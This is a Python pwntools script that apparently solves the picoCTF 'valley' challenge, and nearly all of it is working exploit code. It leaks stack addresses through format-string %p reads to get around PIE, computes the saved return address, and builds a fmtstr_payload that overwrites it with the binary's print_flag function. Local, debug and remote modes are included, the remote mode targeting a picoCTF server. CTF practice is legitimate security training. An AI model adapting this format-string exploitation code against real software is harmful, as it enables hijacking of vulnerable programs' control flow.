# URL - https://play.picoctf.org/practice/challenge/485?category=6&page=1
from pwn import *

def set_setting():
    global BINARY_PATH
    BINARY_PATH = './valley'

    # context.log_level = "critical"
    context.binary = ELF(BINARY_PATH)


def find_offset(payload):
    with process(BINARY_PATH) as p:
        p.sendline(payload)
        p.sendline(b"exit")
        return p.recvall()


def get_print_flag_addr(p):
    print_flag_addr = 0x0000000000001269
    return_to_main_addr = 0x0000000000001413
    addr_offset = 21
    p.sendline(f"%{addr_offset}$p".encode())
    p.recvuntil(b"0x") # skip usless data
    return_to_main_addr_with_offset = int(p.recvline(), 16)
    pie_offset = return_to_main_addr_with_offset - return_to_main_addr
    return print_flag_addr + pie_offset

def get_return_address(p):
    addr_offset = 28
    random_value_return_address_difference = 0x7ffce8e7e208 - 0x7ffce8e7e060 - 0x78

    p.sendline(f"%{addr_offset}$p".encode())
    p.recvuntil(b"0x") # skip usless data
    some_random_value_addr = int(p.recvline(), 16)
    return some_random_value_addr - random_value_return_address_difference

def exploit(p):
    p.recvline() # ingonring welcome letter
    buffer_offset = FmtStr(find_offset).offset
    print_flag_addr = get_print_flag_addr(p)
    return_addr = get_return_address(p)


    info("buffer_offset: %d", buffer_offset)
    info("print_flag_addr: 0x%x", print_flag_addr)
    info("return_addr: 0x%x", return_addr)

    payload = fmtstr_payload(buffer_offset, {return_addr: print_flag_addr}, overflows=100)
    p.sendline(payload)
    p.sendline(b"exit") # exiting out
    print(p.recvall())
    if len(payload) >= 100:
        print("Sometimes the exploit does not work with the given address run another time")


if __name__ == "__main__":
    set_setting()
    mode = input("1(debug), 2(local), 3(remote):    ")
    if mode == '1':
        with gdb.debug(BINARY_PATH, "set disable-randomization off\nb *main\n") as p: exploit(p)
    if mode == '2':
        with process(BINARY_PATH) as p: exploit(p)
    if mode == '3':
        port = int(input("Port number:  "))
        with remote("shape-facility.picoctf.net", port) as p: exploit(p)
